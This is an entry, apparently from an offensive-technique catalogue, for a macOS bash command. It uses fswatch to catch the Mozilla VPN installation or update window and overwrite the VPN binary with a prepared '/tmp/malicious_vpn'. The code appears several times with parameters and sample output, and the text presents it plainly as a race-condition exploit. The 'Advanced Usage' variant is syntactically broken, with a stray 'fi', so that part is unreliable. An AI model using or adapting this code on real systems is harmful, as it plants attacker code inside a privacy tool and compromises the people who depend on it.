---
id: cmd-fswatch-monitor
data: >-
  fswatch /Applications/Mozilla\ VPN.app/Contents/MacOS/ | while read file
  event; do
    if [[ $file == *vpn* ]] && [[ $event == *Created* || $event == *Modified* ]]; then
      echo "Race window detected: $file"
      sleep 0.01
      cp /tmp/malicious_vpn "$file"
      echo "Binary replaced: $file"
    fi
  done
tags:
  - file-monitoring
  - race-condition
type: command
output: |-
  Race window detected: /Applications/Mozilla VPN.app/Contents/MacOS/vpn_binary
  Binary replaced: /Applications/Mozilla VPN.app/Contents/MacOS/vpn_binary
executor: bash
platforms:
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:57.342Z'
verified: false
validated: true
submitted: true
---
# fswatch-monitor

## Command

```bash
fswatch /Applications/Mozilla\ VPN.app/Contents/MacOS/ | while read file event; do
  if [[ $file == *vpn* ]] && [[ $event == *Created* || $event == *Modified* ]]; then
    echo "Race window detected: $file"
    sleep 0.01
    cp /tmp/malicious_vpn "$file"
    echo "Binary replaced: $file"
  fi
done
```

## Description

This command uses fswatch to monitor file system changes in the Mozilla VPN directory on macOS, detecting creation or modification of the VPN binary to exploit a race condition by replacing it with a malicious version. Use it during installation or update to capture the brief timing window.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `/Applications/Mozilla\ VPN.app/Contents/MacOS/` | Path to monitor for binary changes | Yes |
| `sleep 0.01` | Delay to allow write completion before replacement | No (tune based on testing) |
| `/tmp/malicious_vpn` | Path to the prepared malicious binary | Yes |

## Examples

### Basic Usage

```bash
fswatch /Applications/Mozilla\ VPN.app/Contents/MacOS/ | while read file event; do
  if [[ $file == *vpn* ]] && [[ $event == *Created* ]]; then
    cp /tmp/malicious_vpn "$file"
  fi
done
```

### Advanced Usage

```bash
fswatch -o /Applications/Mozilla\ VPN.app/Contents/MacOS/ --event Created,Modified | while read; do
  # Process events with additional logging
  logger "VPN binary event detected"
  cp /tmp/malicious_vpn /Applications/Mozilla\ VPN.app/Contents/MacOS/vpn_binary
  break  # Exit after first replacement
fi
done
```

## Expected Output

Console logs indicating detection and replacement, such as:

Race window detected: /Applications/Mozilla VPN.app/Contents/MacOS/vpn_binary
Binary replaced: /Applications/Mozilla VPN.app/Contents/MacOS/vpn_binary

Successful replacement can be verified post-installation with file timestamps or hashes.

## Related

- [[Related Procedure|procedures/Exploit-Race-Condition-to-Replace-Mozilla-VPN-Binary]]
